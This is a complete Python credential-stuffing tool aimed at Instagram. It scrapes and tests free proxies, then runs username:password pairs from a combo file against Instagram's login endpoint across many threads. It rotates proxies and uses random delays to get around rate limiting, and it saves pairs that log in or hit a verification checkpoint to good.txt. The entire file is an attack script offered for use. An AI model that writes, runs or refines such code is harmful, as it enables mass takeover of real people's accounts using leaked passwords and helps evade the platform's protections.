import requests
import itertools
import logging
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from random import randint
from tqdm import tqdm

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class ProxyManager:
    def __init__(self, proxy_file):
        self.proxy_file = proxy_file
        self.proxies = []
        self.valid_proxies = []

    def update_proxies(self, api_url):
        try:
            logging.info(f"Fetching proxies from {api_url}")
            response = requests.get(api_url)
            response.raise_for_status()
            proxies = response.text.split('\r\n')
            proxies = [proxy.strip() for proxy in proxies if proxy.strip()]

            if proxies:
                self.proxies = proxies
                with open(self.proxy_file, 'w') as file:
                    file.write('\n'.join(self.proxies))
                logging.info(f"Proxies updated successfully. Total proxies: {len(proxies)}")
            else:
                logging.error("No proxies found in the response.")
        except requests.RequestException as e:
            logging.error(f"Failed to update proxies: {e}")

    def read_proxies(self):
        try:
            with open(self.proxy_file, 'r') as file:
                self.proxies = [line.strip() for line in file.readlines() if line.strip()]
                logging.info(f"Loaded {len(self.proxies)} proxies from {self.proxy_file}.")
        except FileNotFoundError:
            logging.error(f"Proxy file {self.proxy_file} not found.")
        except Exception as e:
            logging.error(f"Error reading proxies from {self.proxy_file}: {e}")

    def verify_proxies(self, max_workers=100):
        total_proxies = len(self.proxies)
        logging.info(f"Starting verification of {total_proxies} proxies.")
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_proxy = {executor.submit(self.is_proxy_working, proxy): proxy for proxy in self.proxies}
            
            for future in tqdm(as_completed(future_to_proxy), total=total_proxies, desc="Verifying Proxies", unit="proxy"):
                proxy = future_to_proxy[future]
                try:
                    if future.result():
                        self.valid_proxies.append(proxy)
                except Exception as e:
                    logging.error(f"Error checking proxy {proxy}: {e}")
        
        return self.valid_proxies

    def is_proxy_working(self, proxy):
        url = "https://www.instagram.com/accounts/login/"
        proxies = {"http": proxy, "https": proxy}
        try:
            response = requests.get(url, proxies=proxies, timeout=5)
            return response.status_code == 200
        except requests.RequestException:
            return False

    def get_proxy_cycle(self):
        return itertools.cycle(self.valid_proxies) if self.valid_proxies else None

class InstagramChecker:
    def __init__(self, proxy_manager=None, max_workers=20):
        self.proxy_manager = proxy_manager
        self.proxy_cycle = proxy_manager.get_proxy_cycle() if proxy_manager else None
        self.max_workers = max_workers
        self.checked_count = 0
        self.success_count = 0

    def check_combos(self, file_path):
        with open(file_path, 'r') as file:
            combos = [line.strip() for line in file.readlines() if ':' in line]

        total_combos = len(combos)
        logging.info(f"Starting combo check for {total_combos} entries.")
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.process_combo, combo) for combo in combos]
            
            for future in as_completed(futures):
                future.result()

        logging.info(f"Checked {self.checked_count} accounts.")
        logging.info(f"Successfully logged in to {self.success_count} accounts.")

    def process_combo(self, combo):
        self.checked_count += 1
        username, password = combo.split(':', 1)
        proxy = next(self.proxy_cycle) if self.proxy_cycle else None
        if self.instagram_login_checker(username, password, proxy):
            self.success_count += 1
            logging.info(f"Login successful for {username}")
            with open('good.txt', 'a') as good_file:
                good_file.write(f"{username}:{password}\n")

    def instagram_login_checker(self, username, password, proxy):
        login_url = "https://www.instagram.com/accounts/login/ajax/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        session = requests.Session()
        session.headers.update(headers)
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}

        try:
            response = session.get("https://www.instagram.com/accounts/login/")
            csrf_token = response.cookies.get('csrftoken', '')

            if not csrf_token:
                logging.warning(f"Unable to retrieve CSRF token for {username} with proxy {proxy}")
                return False

            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }

            headers['X-CSRFToken'] = csrf_token

            response = session.post(login_url, data=login_data, headers=headers)

            if response.status_code == 200:
                if response.headers['Content-Type'].startswith('application/json'):
                    result = response.json()
                    if result.get("authenticated"):
                        return True
                    else:
                        self.handle_login_failure(result, username, password)
                        # Consider login successful if verification is required
                        if result.get("checkpoint_url") or result.get("two_factor_required"):
                            return True
                else:
                    logging.warning(f"Unexpected content type for {username}. Content-Type: {response.headers['Content-Type']}")
                    logging.debug(f"Response content: {response.text}")
                    if 'c_user' in response.cookies:
                        logging.info(f"Login successful for {username} despite unexpected content type")
                        return True
                    return False
            elif response.status_code == 400:
                logging.warning(f"Bad Request for {username}. Likely issues with request parameters or proxy. Response: {response.text}")
                return False
            elif response.status_code == 429:
                logging.warning(f"Rate limit exceeded for {username}. Response: {response.text}")
                return False
            else:
                logging.warning(f"Unable to process request for {username}. HTTP Status: {response.status_code}. Response: {response.text}")
                return False
        except requests.exceptions.ProxyError:
            logging.warning(f"Proxy error for {proxy}. Trying next proxy.")
            return False
        except requests.exceptions.RequestException as e:
            logging.warning(f"Request exception: {e}")
            return False
        except ValueError:
            logging.warning(f"Unable to decode JSON response for {username}. Response content: {response.text}")
            return False
        finally:
            time.sleep(randint(1, 3))

    def handle_login_failure(self, result, username, password):
        if "message" in result:
            message = result["message"]
            if message == "checkpoint_required" or message == "two_factor_required":
                logging.info(f"Login failed for {username}: Verification required. Writing to good.txt.")
                with open('good.txt', 'a') as good_file:
                    good_file.write(f"{username}:{password}\n")
            elif message == "Please wait a few minutes before you try again.":
                logging.info(f"Login failed for {username}: Rate limit exceeded. Try again later.")
            else:
                logging.info(f"Login failed for {username}: {message}")
        elif "errors" in result:
            errors = result["errors"]
            if "bad_password" in errors:
                logging.info(f"Login failed for {username}: Incorrect password.")
            elif "invalid_user" in errors:
                logging.info(f"Login failed for {username}: Invalid username.")
            else:
                logging.info(f"Login failed for {username}: {errors}")
        else:
            logging.info(f"Login failed for {username}: Unknown error. Response content: {result}")

def main():
    proxy_api_url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    proxy_file = 'proxys.txt'

    choice = input("Choose option:\n1. Use my own proxies\n2. Download proxies\n3. Use proxyless\nEnter 1, 2, or 3: ").strip()
    
    if choice == '1':
        proxy_manager = ProxyManager(proxy_file)
        logging.info("Using proxies from proxys.txt")
        proxy_manager.read_proxies()
    elif choice == '2':
        proxy_manager = ProxyManager(proxy_file)
        proxy_manager.update_proxies(proxy_api_url)
        proxy_manager.read_proxies()
    elif choice == '3':
        proxy_manager = None
        logging.info("Using proxyless mode (your own IP)")
    else:
        logging.error("Invalid choice. Exiting.")
        return

    if proxy_manager:
        valid_proxies = proxy_manager.verify_proxies(max_workers=100)
        if not valid_proxies:
            logging.error("No valid proxies found.")
            return

    instagram_checker = InstagramChecker(proxy_manager, max_workers=50)
    instagram_checker.check_combos('combo.txt')

if __name__ == "__main__":
    main()
